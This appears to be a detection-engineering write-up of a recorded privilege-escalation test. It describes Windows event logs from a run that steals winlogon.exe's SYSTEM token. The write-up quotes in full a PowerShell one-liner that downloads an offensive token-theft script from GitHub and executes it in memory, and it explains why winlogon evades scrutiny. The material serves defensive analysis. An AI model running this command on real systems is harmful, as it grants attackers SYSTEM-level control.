# T1134.002-2: Create Process with Token — WinPwn Get-WinlogonTokenSystem

## Technique Context

T1134.002 Create Process with Token describes adversaries using a stolen privileged access token to spawn new processes under an elevated security context. This test uses a different toolchain than T1134.002-1: instead of ART's local `GetToken.ps1`, it downloads and executes a WinPwn function specifically targeting the `winlogon.exe` process.

The specific function, `Get-WinLogonTokenSystem`, is from S3cur3Th1sSh1t's `Get-System-Techniques` repository. It targets `winlogon.exe` — the Windows logon process that runs as `NT AUTHORITY\SYSTEM` — to steal a SYSTEM token and use it to spawn a new SYSTEM shell. `winlogon.exe` is a preferred target for token theft because it reliably runs as SYSTEM on all Windows versions and its token grants full SYSTEM privileges without requiring the additional complications of lsass access (which triggers more security tools).

The executed command:
```
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/TokenManipulation/Get-WinlogonTokenSystem.ps1');Get-WinLogonTokenSystem
```

This is a pure in-memory, live-off-the-internet execution: download the script to memory, immediately execute the function. No files are written to disk.

The workflow: `WebClient.DownloadString()` fetches the script, `iex` evaluates it, and `Get-WinLogonTokenSystem` calls `OpenProcess(winlogon)` → `OpenProcessToken()` → `DuplicateTokenEx()` → `CreateProcessWithTokenW("cmd.exe")`.

## What This Dataset Contains

The dataset captures 41 Sysmon events, 4 Security events, 125 PowerShell events, and 1 Application event recorded on ACME-WS06 with Windows Defender fully disabled.

The technique execution is recorded in Security EID 4688. The spawned PowerShell child command line:

```
"powershell.exe" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/TokenManipulation/Get-WinlogonTokenSystem.ps1');Get-WinLogonTokenSystem}
```

Sysmon EID 1 records this spawned process with full hashes: PowerShell SHA256 `3247BCFD...`, IMPHASH `AFACF6DC...`.

Sysmon EID 10 records PowerShell accessing `whoami.exe` and the spawned PowerShell child both with `GrantedAccess: 0x1FFFFF`.

Sysmon EID 17 records two PowerShell named pipe creations for the process lifecycle:
- `\PSHost.134182390965066516.13376.DefaultAppDomain.powershell` (outer test framework)
- `\PSHost.134182391061705210.17468.DefaultAppDomain.powershell` (WinPwn execution)

A notable Sysmon EID 11 event records `C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.26010.5-0\MsMpEng.exe` creating `C:\Windows\Temp\01dcb62c75156fec`. This is Defender's engine writing a temporary file during passive scanning — the same pattern seen in T1123-1. With real-time protection disabled but the engine still running, MsMpEng.exe continues background file system monitoring and writes temp artifacts.

The Application channel contains 1 EID 15 event, likely a .NET runtime or application error event generated during the token manipulation attempt.

The PowerShell channel (125 events, EID 4104) consists primarily of ART test framework boilerplate. The `Get-WinlogonTokenSystem.ps1` script content would appear in EID 4104 events in the child process context.

This dataset uses the `net.webclient` download pattern, unlike T1134.001-1/2 which used `Invoke-WebRequest` (`IWR`). Both patterns produce the same result (in-memory download) but from different PowerShell API surfaces, and they may be logged differently by script block logging.

## What This Dataset Does Not Contain

As with T1134.002-1, the most significant absent events are:
- Sysmon EID 10 with `TargetImage: C:\Windows\System32\winlogon.exe` — the critical process access event showing `powershell.exe` opening `winlogon.exe`
- The `cmd.exe` process that `Get-WinLogonTokenSystem` would spawn with the stolen SYSTEM token

These events should be present in the full dataset. Researchers should query for Sysmon EID 10 events with `winlogon.exe` as the target and for process creation events where the parent PID matches winlogon's PID.

No network events (Sysmon EID 22 or EID 3) are in the Sysmon sample for this dataset, even though the script is downloaded from GitHub. This contrasts with T1134.001-2, which did include DNS and TCP events. The network events are expected to be present in the full dataset — their absence from the 20-event sample reflects sampling variability.

The `iex(new-object net.webclient).downloadstring(...)` invocation does not appear in any EID 4104 script block in this sample. Because the entire command is passed as a command-line argument to the spawned `powershell.exe`, the download URL appears in the process creation log (EID 4688 / Sysmon EID 1) rather than as a script block. If `Get-WinlogonTokenSystem.ps1` contains its own `iex` or script block calls, those would appear in subsequent EID 4104 events.

Compared to the defended variant (52 Sysmon / 10 Security / 51 PowerShell), this dataset is very similar in Sysmon (41 vs. 52) and Security (4 vs. 10). The slightly higher defended Sysmon count is likely because Defender's inspection of the winlogon access generated additional EID 7 or EID 10 events. The PowerShell channels are nearly equal (125 vs. 51) — interestingly, this defended comparison shows less of the AMSI-absence inflation seen in other tests, possibly because the defended run for this test also produced a higher PS event count.

## Assessment

This dataset and T1134.002-1 together illustrate two distinct approaches to the same outcome — SYSTEM shell via token duplication — using different target processes (lsass vs. winlogon) and different script sources (local ART file vs. live download). The differences are operationally meaningful: targeting `winlogon.exe` avoids the intense scrutiny that lsass-targeting generates, and the live-download approach avoids leaving script files on disk.

The command-line indicators in this dataset are high-fidelity: `Get-WinLogonTokenSystem` is a specific function name from a known offensive tool repository, and the GitHub URL is attributable. However, the most definitive technique-specific events (process access to winlogon, spawning of the privileged child process) are likely in the full dataset rather than this sample.

For detection engineering, this dataset primarily provides command-line and process-ancestry indicators. The full dataset should be used to build behavioral analytics incorporating the winlogon process access event.

## Detection Opportunities Present in This Data

**`Get-WinLogonTokenSystem` in a PowerShell command line.** Security EID 4688 and Sysmon EID 1 record the function name verbatim. This function is specific to S3cur3Th1sSh1t's `Get-System-Techniques` toolkit and has no legitimate use in enterprise environments.

**`iex(new-object net.webclient).downloadstring(...)` with a GitHub URL.** The `net.webclient` download-and-execute pattern is present in the EID 4688 command line. This specific URL (pointing to `Get-System-Techniques/master/TokenManipulation/`) references a known privilege escalation script repository.

**PowerShell-to-PowerShell double-hop for in-memory execution.** Sysmon EID 1 records the outer test framework spawning a child PowerShell with the WinPwn download command. This pattern — outer PowerShell orchestrating a child PowerShell to run downloaded offensive code — is a core pattern of PowerShell-based post-exploitation frameworks.

**MsMpEng.exe temp file creation during the test window.** Sysmon EID 11 recording `MsMpEng.exe` creating `C:\Windows\Temp\01dcb62c75156fec` is Defender passive monitoring activity. This artifact's presence confirms Defender was running (even with real-time protection disabled) and noticed something that triggered background scanning during the winlogon access phase.

**Sysmon EID 10 targeting winlogon.exe.** While absent from this sample, this event in the full dataset is the ground-truth record of the token theft operation. Sysmon EID 10 events targeting `winlogon.exe` from non-SYSTEM processes, or from SYSTEM processes with `GrantedAccess` flags that include `PROCESS_DUP_HANDLE (0x0040)` or `PROCESS_QUERY_INFORMATION (0x0400)`, indicate token duplication activity.
